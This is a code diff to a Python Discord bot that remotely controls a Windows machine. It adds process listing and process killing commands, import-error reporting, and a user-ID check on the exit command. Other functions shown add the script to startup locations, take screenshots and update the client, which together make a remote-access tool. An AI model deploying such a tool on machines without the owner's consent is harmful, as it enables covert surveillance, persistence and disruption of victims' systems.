@@ -1,28 +1,121 @@
-import discord
-import asyncio
-import socket
-import os
-import getpass
-import aiohttp
-import zipfile
-import shutil
-import sys
-import time
-import ctypes
-import threading
-import json
-import uuid
-import subprocess
-import pyautogui
-import psutil
-import GPUtil
-from screeninfo import get_monitors
-import mss
-import pythoncom
-from win32com.client import Dispatch
-import winreg as reg
+import_errors = []
 
-Version = "0.0.4"
+try:
+  import discord
+except ImportError:
+  import_errors.append("discord module is not available. Please install it using 'pip install discord.py'.")
+
+try:
+  import asyncio
+except ImportError:
+  import_errors.append("asyncio module is not available. Please ensure you are using Python 3.4 or later.")
+
+try:
+  import socket
+except ImportError:
+  import_errors.append("socket module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import os
+except ImportError:
+  import_errors.append("os module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import getpass
+except ImportError:
+  import_errors.append("getpass module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import aiohttp
+except ImportError:
+  import_errors.append("aiohttp module is not available. Please install it using 'pip install aiohttp'.")
+
+try:
+  import zipfile
+except ImportError:
+  import_errors.append("zipfile module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import shutil
+except ImportError:
+  import_errors.append("shutil module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import sys
+except ImportError:
+  import_errors.append("sys module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import time
+except ImportError:
+  import_errors.append("time module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import ctypes
+except ImportError:
+  import_errors.append("ctypes module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import threading
+except ImportError:
+  import_errors.append("threading module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import json
+except ImportError:
+  import_errors.append("json module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import uuid
+except ImportError:
+  import_errors.append("uuid module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import subprocess
+except ImportError:
+  import_errors.append("subprocess module is not available. Please ensure you are using a standard Python distribution.")
+
+try:
+  import pyautogui
+except ImportError:
+  import_errors.append("pyautogui module is not available. Please install it using 'pip install pyautogui'.")
+
+try:
+  import psutil
+except ImportError:
+  import_errors.append("psutil module is not available. Please install it using 'pip install psutil'.")
+
+try:
+  import GPUtil
+except ImportError:
+  import_errors.append("GPUtil module is not available. Please install it using 'pip install gputil'.")
+
+try:
+  from screeninfo import get_monitors
+except ImportError:
+  import_errors.append("screeninfo module is not available. Please install it using 'pip install screeninfo'.")
+
+try:
+  import mss
+except ImportError:
+  import_errors.append("mss module is not available. Please install it using 'pip install mss'.")
+
+try:
+  import pythoncom
+except ImportError:
+  import_errors.append("pythoncom module is not available. Please install it using 'pip install pywin32'.")
+
+try:
+  from win32com.client import Dispatch
+except ImportError:
+  import_errors.append("win32com.client module is not available. Please install it using 'pip install pywin32'.")
+
+try:
+  import winreg as reg
+except ImportError:
+  import_errors.append("winreg module is not available. Please ensure you are using a standard Python distribution on Windows.")
+
+Version = "0.0.5"
 
 # Configuration file path
 CONFIG_FILE_PATH = 'config.json'
@@ -147,9 +240,11 @@ async def handle_status_command(message):
   embed.add_field(name="Uptime", value=f"```{time.strftime('%H:%M:%S', time.gmtime(time.time() - psutil.boot_time()))}```", inline=False)
   embed.add_field(name="Version", value=f"```{Version}```", inline=True)
 
-  # Check for any errors (this is a placeholder, you can add your own error checks)
-  errors = "No errors detected."
-  embed.add_field(name="Errors", value=f"```{errors}```", inline=False)
+  if import_errors:
+    error_message = "\n".join(import_errors)
+    embed.add_field(name="Errors", value=f"```{error_message}```", inline=False)
+  else:
+    embed.add_field(name="Errors", value="No errors", inline=False)
 
   await message.channel.send(embed=embed)
 
@@ -319,10 +414,15 @@ async def handle_restart_command(message):
   await message.channel.send('Restarting bot...')
   restart_bot()
 
+AUTHORIZED_USER_ID = '1283076171533127761'  # Replace with the actual user ID
+
 async def handle_exit_command(message):
-  """Handles the exit command."""
-  await message.channel.send('Shutting down...')
-  await client.close()
+    """Handles the exit command."""
+    if str(message.author.id) == AUTHORIZED_USER_ID:
+        await message.channel.send('Shutting down...')
+        await client.close()
+    else:
+        await message.channel.send('You are not authorized to use this command.')
 
 def add_to_taskmanager_startup():
     """Add the script to the Task Manager startup."""
@@ -403,6 +503,93 @@ async def handle_remove_from_startup_folder_command(message):
   remove_from_startup_folder()
   await message.channel.send("Successfully removed from startup folder.")
 
+
+def chunk_list(lst, max_chunk_size):
+    """Chunks a list into smaller lists of a specified size."""
+    chunk = []
+    current_size = 0
+    for item in lst:
+        item_size = len(item) + 1  # +1 for the newline character
+        if current_size + item_size > max_chunk_size:
+            yield chunk
+            chunk = []
+            current_size = 0
+        chunk.append(item)
+        current_size += item_size
+    if chunk:
+        yield chunk
+
+async def handle_task_kill_command(message):
+  """Handles the task kill command."""
+  try:
+    # Extract the argument from the message content
+    args = message.content.split(maxsplit=1)
+    if len(args) < 2:
+      await message.channel.send("Please provide a PID or task name.")
+      return
+    
+    arg = args[1].strip()
+    await message.channel.send(f"Attempting to kill task: {arg}")  # Debug message
+    
+    # Check if the argument is a PID (number) or a task name (string)
+    if arg.isdigit():
+      pid = int(arg)
+      # Attempt to terminate the process by PID
+      proc = psutil.Process(pid)
+      proc.terminate()
+      await message.channel.send(f"Process with PID {pid} has been terminated.")
+    else:
+      # Attempt to terminate processes by name
+      task_name = arg
+      found = False
+      for proc in psutil.process_iter(['pid', 'name']):
+        if proc.info['name'].lower() == task_name.lower():
+          proc.terminate()
+          await message.channel.send(f"Process '{task_name}' with PID {proc.info['pid']} has been terminated.")
+          found = True
+      if not found:
+        await message.channel.send(f"No process found with name '{task_name}'.")
+  except (IndexError, ValueError):
+    await message.channel.send("Please provide a valid PID or task name.")
+  except psutil.NoSuchProcess:
+    await message.channel.send(f"No process found with PID {pid}.")
+  except psutil.AccessDenied:
+    await message.channel.send(f"Access denied to terminate process with PID {pid}.")
+  except Exception as e:
+    await message.channel.send(f"An error occurred: {str(e)}")
+    print(f"Error in handle_task_kill_command: {str(e)}")
+
+async def handle_task_list_command(message):
+    """Handles the task list command."""
+    apps = []
+    background_processes = []
+    
+    for proc in psutil.process_iter(['pid', 'name', 'username']):
+        if proc.info['username'] == psutil.users()[0].name:
+            apps.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}")
+        else:
+            background_processes.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}")
+    
+    max_embed_size = 4096  # Maximum size for embed description
+    max_chunk_size = max_embed_size - 200  # Leave some buffer for embed formatting
+    
+    app_chunks = list(chunk_list(apps, max_chunk_size))
+    background_chunks = list(chunk_list(background_processes, max_chunk_size))
+    
+    # Send app chunks
+    for i, chunk in enumerate(app_chunks):
+        app_list = "\n".join(chunk)
+        embed_apps = discord.Embed(title=f"Apps (Part {i + 1})", description=f"```{app_list}```", color=0x00ff00)
+        await message.channel.send(embed=embed_apps)
+    
+    # Send background process chunks
+    for i, chunk in enumerate(background_chunks):
+        background_list = "\n".join(chunk)
+        embed_background = discord.Embed(title=f"Processes (Part {i + 1})", description=f"```{background_list}```", color=0x00ff00)
+        await message.channel.send(embed=embed_background)
+
+
+
 # Dictionary to map commands to their corresponding handler functions
 command_handlers = {
     'hello': handle_hello_command,
@@ -412,6 +599,8 @@ command_handlers = {
     'remove from taskmanager startup': handle_remove_from_taskmanager_startup_command,
     'remove from startup folder': handle_remove_from_startup_folder_command,
     'help': handle_help_command,
+    'tasklist': handle_task_list_command,
+    'taskkill': handle_task_kill_command,
     'update client': handle_update_command,
     'message box': handle_message_box_command,
     'screenshot': handle_screenshot_command,
